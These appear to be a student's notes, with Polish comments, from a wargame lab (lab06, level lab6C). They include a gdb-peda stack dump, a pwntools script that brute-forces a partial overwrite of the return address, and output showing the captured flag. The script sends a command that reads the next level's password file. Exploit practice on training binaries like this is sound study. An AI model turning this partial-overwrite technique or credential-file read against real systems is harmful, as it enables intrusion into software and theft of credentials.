@@ -1,0 +1,77 @@
+r <<< $(python -c 'print "B"*40+"\xc6"+"\n"+"C"*281+"\x2b"+"\x77"')
+
+gdb-peda$ hexdump $esp-(16*8) 32*8
+0xbfedb31c : 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43   CCCCCCCCCCCCCCCC
+0xbfedb32c : 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43   CCCCCCCCCCCCCCCC
+0xbfedb33c : 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43   CCCCCCCCCCCCCCCC
+0xbfedb34c : 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43   CCCCCCCCCCCCCCCC
+0xbfedb35c : 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43   CCCCCCCCCCCCCCCC
+0xbfedb36c : 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43   CCCCCCCCCCCCCCCC
+0xbfedb37c : 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43   CCCCCCCCCCCCCCCC
+0xbfedb38c : 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43   CCCCCCCCCCCCCCCC
+0xbfedb39c : 2b 77 7a b7 80 1a 7a b7 00 00 7a b7 ab 19 7a b7   +wz...z...z...z.
+0xbfedb3ac : 00 e0 76 b7 a0 19 7a b7 00 e0 76 b7 00 00 00 00   ..v...z...v.....
+0xbfedb3bc : 83 da 5d b7 01 00 00 00 54 b4 ed bf 5c b4 ed bf   ..].....T...\...
+0xbfedb3cc : ea dc 78 b7 01 00 00 00 54 b4 ed bf f4 b3 ed bf   ..x.....T.......
+0xbfedb3dc : 24 30 7a b7 10 13 7a b7 00 e0 76 b7 00 00 00 00   $0z...z...v.....
+0xbfedb3ec : 00 00 00 00 00 00 00 00 52 33 26 a0 43 37 f5 c0   ........R3&.C7..
+0xbfedb3fc : 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00   ................
+0xbfedb40c : c0 15 7a b7 00 00 00 00 00 35 79 b7 99 d9 5d b7   ..z......5y...].
+
+
+=> 0xb77a17ec <handle_tweet+114>:	ret
+
+
+
+exploit:
+
+lab6C@warzone:/levels/lab06$ cat /tmp/exploit500.py
+from pwn import *
+
+
+for x in range(20):
+    p = process("./lab6C")
+
+    p.recv(1000)
+
+    exploit1 = "A"*40
+    exploit1 += "\xc6"
+
+    pad = 0x55
+    exploit2 = "C"*(281-pad)
+    exploit2 += "\x2b"
+    exploit2 += "\x77"
+
+    p.sendline(exploit1)
+
+    p.recv(500)
+
+    p.sendline(exploit2)
+    p.recv(200)
+
+    p.sendline("cat /home/lab6B/.pass")
+
+    try:
+        print p.recvline()
+        break
+    except EOFError as e:
+        pass
+
+
+ ew. zamiast for x... dać while True
+
+ Różnica stacka 0x55!!
+
+Ogólnie chodzi o to, że to my decydujemy o 3 argumencie strncpy,
+więc warto podejrzeć stack gdzie się wypełnia zerami itp.
+
+w tweecie wypełniamy stack i brute force kawałka adresu
+
+
+lab6C@warzone:/levels/lab06$ python /tmp/exploit.py
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+p4rti4l_0verwr1tes_r_3nuff
+
+[*] Stopped program './lab6C'
+[*] Program './lab6C' stopped with exit code -11
